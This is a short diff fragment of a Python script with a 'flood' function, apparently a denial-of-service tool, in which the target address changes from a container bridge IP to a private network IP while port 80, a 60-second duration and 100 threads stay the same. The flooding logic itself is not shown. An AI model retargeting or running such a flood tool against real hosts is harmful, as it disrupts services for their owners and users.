@@ -32,7 +32,7 @@ def flood(target_ip, target_port, duration, num_threads):
         thread._stop()  
 
 if __name__ == "__main__":
-    target_ip = '172.17.0.1'  
+    target_ip = '192.168.4.53'  
     target_port = 80
     duration = 60  
     num_threads = 100  
